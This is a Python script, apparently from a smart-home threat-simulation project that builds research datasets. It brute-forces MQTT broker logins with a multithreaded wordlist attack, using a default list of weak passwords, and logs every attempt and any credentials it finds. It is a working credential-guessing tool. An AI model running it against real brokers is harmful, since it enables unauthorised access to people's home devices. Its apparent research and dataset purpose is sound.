import paho.mqtt.client as mqtt
import time
import argparse
import sys
import threading
import json
import os
import csv
import random
from queue import Queue
from datetime import datetime

import sys
import os

# Ensure the project root is in the path for forensic_utils
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from forensic_utils import DualLogger, get_timestamp, get_iso_now

# Standardized Research Banners
BANNER = """
==================================================
  SOVEREIGNTY RESEARCH: AUTHENTICATION AUDITOR
==================================================
"""

# Configuration for standardized logging
BASE_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset"
LOG_DIR = os.path.join(BASE_DIR, "logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")

class AttemptLogger:
    """Handles high-fidelity forensic logging of individual authentication attempts."""
    def __init__(self, target_ip):
        self.timestamp = get_timestamp()
        self.base_name = f"brute_attempts_{self.timestamp}"
        self.headers = ["timestamp", "target", "username", "password", "rc", "latency_ms", "result"]

    def log_attempt(self, target, user, pwd, rc, latency, result):
        record = {
            "timestamp": get_iso_now(),
            "target": target,
            "username": user,
            "password": pwd,
            "rc": rc,
            "latency_ms": round(latency * 1000, 2),
            "result": result
        }
        # Appending to research audit folder in dual format
        DualLogger.append_raw(record, LOG_DIR, self.base_name, headers=self.headers)

def try_password(broker, port, username, password, logger, results):
    """Attempts a single credentials combination and captures telemetry."""
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"audit_{random.getrandbits(16)}")
    client.username_pw_set(username, password)
    
    start_time = time.time()
    rc = -1
    result_str = "ERROR"
    
    try:
        rc = client.connect(broker, port, 5)
        latency = time.time() - start_time
        
        if rc == 0:
            result_str = "SUCCESS"
            results['success'] = True
            results['password'] = password
            client.disconnect()
        elif rc == 4:
            result_str = "BAD_CREDENTIALS"
        elif rc == 5:
            result_str = "UNAUTHORIZED"
        else:
            result_str = f"REFUSED_{rc}"
            
    except Exception as e:
        latency = time.time() - start_time
        result_str = "CONNECTION_FAILED"
        rc = 99
    
    logger.log_attempt(broker, username, password, rc, latency, result_str)
    return rc == 0

def worker(broker, port, username, queue, logger, results, stop_event, progress):
    while not queue.empty() and not stop_event.is_set():
        password = queue.get()
        if try_password(broker, port, username, password, logger, results):
            stop_event.set()
        
        progress['current'] += 1
        queue.task_done()

def print_progress(current, total, start_time):
    elapsed = time.time() - start_time
    mps = current / elapsed if elapsed > 0 else 0
    percent = (current / total) * 100
    sys.stdout.write(f"\r🔍 Testing: {percent:.1f}% | Attempt: {current}/{total} | Speed: {mps:.2f} att/s")
    sys.stdout.flush()

def main():
    parser = argparse.ArgumentParser(description="Advanced MQTT Brute Force Simulation")
    parser.add_argument("--broker", default="192.168.21.89", help="Target Broker IP")
    parser.add_argument("--port", type=int, default=1883, help="Broker Port")
    parser.add_argument("--username", default="admin", help="Target Username")
    parser.add_argument("--wordlist", nargs="*", help="Direct list of passwords")
    parser.add_argument("--file", help="Path to password file (.txt)")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads")
    
    args = parser.parse_args()

    # Build wordlist
    final_wordlist = []
    if args.file:
        if os.path.exists(args.file):
            with open(args.file, 'r') as f:
                final_wordlist = [line.strip() for line in f if line.strip()]
        else:
            print(f"❌ Error: Wordlist file {args.file} not found.")
            return
    elif args.wordlist:
        final_wordlist = args.wordlist
    else:
        final_wordlist = ["admin", "1234", "password", "iot123", "root", "123456", "admin123", "smart", "home"]

    print(f"\n🚀 [ADVANCED SECURITY AUDIT START] 🚀")
    print(f"Targeting: {args.broker}:{args.port} | Pool: {len(final_wordlist)}")
    print("-" * 50)

    logger = AttemptLogger(args.broker)
    password_queue = Queue()
    for pwd in final_wordlist:
        password_queue.put(pwd)

    results = {'success': False, 'password': None}
    stop_event = threading.Event()
    progress = {'current': 0}
    threads = []
    start_time = time.time()

    for i in range(args.threads):
        t = threading.Thread(target=worker, args=(args.broker, args.port, args.username, password_queue, logger, results, stop_event, progress))
        t.start()
        threads.append(t)

    total = len(final_wordlist)
    while any(t.is_alive() for t in threads):
        print_progress(progress['current'], total, start_time)
        time.sleep(0.5)

    for t in threads:
        t.join()

    duration = time.time() - start_time

    print(f"\n" + "-" * 50)
    if results['success']:
        print(f"✅ AUDIT SUCCESS: Credentials valid! [{args.username}:{results['password']}]")
    else:
        print("❌ AUDIT FAILED: No valid credentials found.")

    # Save standardized session summary
    session_ts = get_timestamp()
    summary = {
        "timestamp": session_ts,
        "attack_type": "Brute_Force",
        "target": args.broker,
        "username": args.username,
        "total_attempts": progress['current'],
        "success": results['success'],
        "duration_sec": round(duration, 2),
        "audit_trace_base": logger.base_name
    }
    
    json_p, csv_p = DualLogger.log_session(summary, SESSIONS_DIR, f"brute_session_{session_ts}")

    print(f"📊 Raw Attempt Trace: {LOG_DIR}/{logger.base_name} (.json/.csv)")
    print(f"📊 Session Summary  : {json_p} (+.csv)")
    print("-" * 50)

if __name__ == "__main__":
    main()
